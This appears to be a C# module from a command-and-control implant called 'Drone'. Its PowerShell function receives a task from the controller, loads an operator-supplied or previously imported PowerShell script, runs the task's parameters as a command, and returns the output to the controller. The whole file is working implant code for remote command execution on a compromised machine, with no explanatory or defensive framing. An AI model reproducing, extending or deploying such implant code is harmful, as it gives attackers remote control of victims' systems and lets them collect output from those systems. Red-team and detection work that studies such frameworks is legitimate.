using System.Text;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Functions;

public class PowerShell : DroneFunction
{
    public override string Name => "powershell";
    
    public override void Execute(DroneTask task)
    {
        using var runner = new PowerShellRunner();

        string script = null;
        
        // if task has a script, ignore imported scripts
        if (task.Artefact is not null && task.Artefact.Length > 0)
        {
            script = Encoding.ASCII.GetString(task.Artefact);
        }
        else if(!string.IsNullOrWhiteSpace(PowerShellImport.ImportedScript))
        {
            script = PowerShellImport.ImportedScript;
        }

        if (!string.IsNullOrWhiteSpace(script))
        {
            if (script.StartsWith("?"))
                script = script.Remove(0, 3);
            
            runner.ImportScript(script);
        }

        var command = string.Join(" ", task.Parameters);
        var result = runner.Invoke(command);
            
        Drone.SendOutput(task.TaskId, result);
    }
}